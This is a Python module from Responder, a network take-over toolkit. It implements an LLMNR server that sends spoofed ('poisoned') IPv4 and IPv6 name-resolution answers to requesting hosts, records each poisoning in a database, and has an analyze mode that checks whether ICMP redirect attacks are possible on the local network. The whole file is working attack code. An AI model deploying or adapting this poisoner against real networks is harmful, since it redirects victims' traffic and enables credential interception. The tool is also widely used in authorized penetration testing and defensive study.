#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from packets import LLMNR_Ans, LLMNR6_Ans
from utils import *

if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

#Should we answer to those AAAA?
Have_IPv6 = settings.Config.IPv6

def Parse_LLMNR_Name(data):
	import codecs
	NameLen = data[12]
	if (sys.version_info > (3, 0)):
		return data[13:13+NameLen]
	else:
		NameLen2 = int(codecs.encode(NameLen, 'hex'), 16)
		return data[13:13+int(NameLen2)]

def IsICMPRedirectPlausible(IP):
	dnsip = []
	try:
		# Windows-compatible DNS server detection
		import subprocess
		import re
		
		# Use PowerShell to get DNS servers on Windows
		result = subprocess.run([
			'powershell', '-Command', 
			'Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object {$_.ServerAddresses -ne $null} | Select-Object -ExpandProperty ServerAddresses'
		], capture_output=True, text=True, shell=True)
		
		if result.returncode == 0:
			# Parse PowerShell output
			for line in result.stdout.strip().split('\n'):
				line = line.strip()
				if line and re.match(r'^\d+\.\d+\.\d+\.\d+$', line):
					dnsip.append(line)
		else:
			# Fallback: try to parse nslookup output
			try:
				nslookup_result = subprocess.run(['nslookup', 'localhost'], capture_output=True, text=True, shell=True)
				for line in nslookup_result.stdout.split('\n'):
					if 'Address:' in line and '#53' not in line:
						# Extract IP address from "Address: x.x.x.x" line
						ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
						if ip_match:
							dnsip.append(ip_match.group(1))
			except:
				# Last resort: use common DNS servers for analysis
				dnsip = ['8.8.8.8', '1.1.1.1']
				
		for x in dnsip:
			if x != "127.0.0.1" and IsIPv6IP(x) is False and IsOnTheSameSubnet(x,IP) is False:	#Temp fix to ignore IPv6 DNS addresses
				print(color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5))
				print(color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5))
				print(color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5))
	except Exception as e:
		# If DNS detection fails, skip ICMP redirect analysis
		pass

if settings.Config.AnalyzeMode:
	IsICMPRedirectPlausible(settings.Config.Bind_To)


class LLMNR(BaseRequestHandler):  # LLMNR Server class
	def handle(self):
		try:
			data, soc = self.request
			Name = Parse_LLMNR_Name(data).decode("latin-1")
			if settings.Config.AnswerName is None:
				AnswerName = Name
			else:
				AnswerName = settings.Config.AnswerName
			LLMNRType = Parse_IPV6_Addr(data)

			# Break out if we don't want to respond to this host
			if RespondToThisHost(self.client_address[0].replace("::ffff:",""), Name) is not True:
				return None
			#IPv4
			if data[2:4] == b'\x00\x00' and LLMNRType:
				if settings.Config.AnalyzeMode:
					LineHeader = "[Analyze mode: LLMNR]"
					print(color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
					SavePoisonersToDb({
							'Poisoner': 'LLMNR', 
							'SentToIp': self.client_address[0], 
							'ForName': Name,
							'AnalyzeMode': '1',
							})

				elif LLMNRType == True:  # Poisoning Mode
					#Default:
					if settings.Config.TTL == None:
						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName)
					else:
						Buffer1 = LLMNR_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName, TTL=settings.Config.TTL)
					Buffer1.calculate()
					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
					if not settings.Config.Quiet_Mode:
						LineHeader = "[*] [LLMNR]"
						if settings.Config.AnswerName is None:
							print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
						else:
							print(color("%s  Poisoned answer sent to %s for name %s (spoofed answer name %s)" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name, AnswerName), 2, 1))
					SavePoisonersToDb({
							'Poisoner': 'LLMNR', 
							'SentToIp': self.client_address[0], 
							'ForName': Name,
							'AnalyzeMode': '0',
							})

				elif LLMNRType == 'IPv6' and Have_IPv6:
					#Default:
					if settings.Config.TTL == None:
						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName)
					else:
						Buffer1 = LLMNR6_Ans(Tid=NetworkRecvBufferPython2or3(data[0:2]), QuestionName=Name, AnswerName=AnswerName, TTL=settings.Config.TTL)
					Buffer1.calculate()
					soc.sendto(NetworkSendBufferPython2or3(Buffer1), self.client_address)
					if not settings.Config.Quiet_Mode:
						LineHeader = "[*] [LLMNR]"
						if settings.Config.AnswerName is None:
							print(color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name), 2, 1))
						else:
							print(color("%s  Poisoned answer sent to %s for name %s (spoofed answer name %s)" % (LineHeader, self.client_address[0].replace("::ffff:",""), Name, AnswerName), 2, 1))
					SavePoisonersToDb({
							'Poisoner': 'LLMNR6', 
							'SentToIp': self.client_address[0], 
							'ForName': Name,
							'AnalyzeMode': '0',
							})

		except:
			pass
